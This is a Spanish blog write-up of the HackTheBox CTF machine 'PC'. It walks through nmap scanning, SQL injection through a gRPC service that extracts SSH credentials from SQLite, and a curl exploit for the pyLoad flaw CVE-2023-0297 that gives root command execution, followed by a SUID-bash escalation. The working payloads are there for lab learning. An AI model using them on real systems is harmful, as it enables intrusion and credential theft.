---
layout: single
title: "HackTheBox Writeup — PC"
categories: writeups
header:
    image: /assets/images/writeups/pc/cabecera.webp
---

Hola a todos soy Puchy y este será mi primer writeup espero que de muchos sobre un ejercicio CTF, en este caso de la máquina *PC* de [Hack the Box](https://app.hackthebox.com/home), para este tipo de problemas intento seguir siempre una misma metodología que se irá viendo a lo largo de este ejercicio en la separación de los apartados. Espero que al que este leyendo esto le sea de utilidad, le guste y aprenda algo.

# 1. Enumeración

Lo primero por lo que empezamos tras probar que tenemos conectividad con el servidor es hacer un reconocimiento de puertos a la máquina víctima para ello hago dos barridos, un escaneo rápido que me muestre todos los puertos abiertos y uno más exhaustivo para averiguar software o versiones de esos puertos.

**Escaneo rápido:**
*sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.214 -oN allPorts.nmap*
```ruby
# Nmap 7.94 scan initiated Wed Sep  6 12:07:55 2023 as: nmap -p- -sS --min-rate 5000 -vvv -n -Pn -oN allPorts.nmap 10.10.11.214
Nmap scan report for 10.10.11.214
Host is up, received user-set (0.062s latency).
Scanned at 2023-09-06 12:07:55 CEST for 26s
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
50051/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Sep  6 12:08:21 2023 -- 1 IP address (1 host up) scanned in 26.61 seconds
```

**Escaneo de versiones:**
*nmap -p22,50051 -sCV 10.10.11.214 -oN versionPorts.nmap*
```ruby
# Nmap 7.94 scan initiated Wed Sep  6 12:09:40 2023 as: nmap -p22,50051 -Pn -sCV -oN versionPorts.nmap 10.10.11.214
Nmap scan report for 10.10.11.214
Host is up (0.048s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.94%I=7%D=9/6%Time=64F84FF7%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06
SF:\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GenericL
SF:ines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetReq
SF:uest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPOp
SF:tions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSPR
SF:equest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPCC
SF:heck,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVer
SF:sionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\x
SF:ff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"
SF:)%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\
SF:x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0
SF:\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\
SF:?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0
SF:\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05
SF:\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\
SF:?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\
SF:xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08
SF:\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\
SF:xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0
SF:\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  6 12:10:07 2023 -- 1 IP address (1 host up) scanned in 27.66 seconds
```
Esta vez estamos un caso un tanto especial ya que los puertos abiertos son el típico de *ssh* y uno muy extraño como es el 50051, que tras una larga búsquedad en Internet podemos averiguar que es el puerto por defecto de [gRPC](https://grpc.io/), el cual es un protocolo que permite la comunicación eficiente entre aplicaciones.

# 2. Reconocimiento de vulnerabilidades

Usando la herramienta [grpcui](https://github.com/fullstorydev/grpcui) con el comando `./grpcui --plaintext 10.10.11.214:50051` esta actúa como proxy y te permite hacer peticiones de manera gráfica al servidor.

![image-center](/assets/images/writeups/pc/grpcui.png){: .align-center}

Básicamente en la aplicación permite crear usuarios, loguearse y pedir información qué solo responde con *Will update soon*; si se prueba con *admin:admin* permite loguearse. Los token que da tienen el formato *b'token_de_la_cabecera'* por lo que a la hora de añadirlo en *getInfo* de cabecera hay que hacerlo sin la *b* y sin las comillas. Tras probar varias vulnerabilidades comprobé que el campo *id* en la función `getInfo` parecía ser vulnerable a una SQL injection, ya que al añafir al final `' OR 1=1 -- -` no daba ningún tipo de error.

# 3. Explotando vulnerabilidades

Tras probar unas cuantas inyecciones distitas para hallar que tipo de base de datos del que se trataba llegué a la conclusión de que era una *SQLite* gracias a esta inyección:

```sql
<id>' UNION SELECT 1 FROM sqlite_master--
```

Una vez que sabemos que existe esta tabla podemos obtener el nombre de las tablas que hay con la inyección `<id>' UNION SELECT tbl_name FROM sqlite_master--`, de la cual obtenemos que existe la tabla `accounts`. Para obtener los campos de esta tabla podemos usar la siguiente inyección `<id>' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='accounts'--` lo que nos da como resuldato lo siguiente:

```json
{
  "message": "CREATE TABLE \"accounts\" (\n\tusername TEXT UNIQUE,\n\tpassword TEXT\n)"
}
```

Gracias a esto sabemos que la tabla tiene dos campos el *username* y *password*. Para saber el número de usuarios que hay en el sistema podemos hacer la consulta con `count(*)` y podemos ver que hay dos usuarios registrados. Añadiendo en la consulta el parámetro *OFFSET* podemos ir uno a uno viendo el nombre y contraseña de cada usuario, la inyección sería la siguiente:

```sql
<id>' UNION SELECT username FROM accounts LIMIT 1 OFFSET 1 --
```

Con esto obtenemos que existe usuario se llama *sau* y que su contraseña es *HereIsYourPassWord1431*, por lo que procedí a probar estos credenciales para el servicio *ssh* y así se obtenemos una conexión con la máquina y la flag de usuario.

# 4. Escalada de privilegios

Para escalar privilegios suelo empezar por mirar versiones, comandos de posible ejecución sudo o bits SUID, pero nada de eso estaba disponible. Pero al revisar los puertos internos que estan en esucha con el comando `netstat -tulpn` vemos que hay un servicio no listado eschuchando en el puerto 8000.

```ruby
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::50051                :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```


Por el número puerto podríamos intuir que es un servicio web para hacer esto podemos realizar por forwarding con ssh para poderla ver correctamente desde mi navegador, esto lo haremos con este comando `ssh -L 8000:localhost:8000 sau@10.10.11.214` en este se indica que quiero que a través del puerto 8000 de mi equipo quiero conectarme a través de esa conexión ssh al puerto 8000 del otro equipo, y encuentro esta página.

![image-center](/assets/images/writeups/pc/pyload.png){: .align-center}

Con una búsqueda rápida se ve que seguramente sea vulnerable al [CVE-2023-0297](https://nvd.nist.gov/vuln/detail/CVE-2023-0297) con el que con este [exploit](https://www.exploit-db.com/exploits/51532) unicamente haciendo una petición HTTP tenemos ejecución remota de comandos como root. Aquí muestro una prueba con el comando curl de como se crearía el archivo *prueba* en `/tmp`.

```bash
curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/prueba\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://localhost:8000/flash/addcrypted2'
```
Como no me daba respuesta la reverse shell, lo hice de una manera más simple dandole permisos SUID a la bash.

![image-center](/assets/images/writeups/pc/suid-bash.png){: .align-center}

Y con esto ya podemos leer la flag del directorio `/root` y la máquina estaría resuelta!!!

Como vemos se trata de una máquina muy interesante y un poco distinta al tratarse de un protocolo tan poco conocido que al principio puede desconcertar un poco. Sin más un saludo, gracias por leerme y a seguir aprendiendo.

